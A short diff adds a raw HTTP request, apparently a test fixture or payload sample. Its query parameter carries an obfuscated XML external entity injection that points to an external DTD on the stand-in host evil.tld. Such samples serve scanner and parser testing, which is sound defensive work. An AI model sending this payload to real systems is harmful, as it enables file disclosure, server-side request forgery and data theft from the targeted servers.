@@ -1,0 +1,4 @@
+GET /a?url=<!/*x*/DOCTYPE%20r%20SYSTEM%20"http://evil.tld/evil.dtd"> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
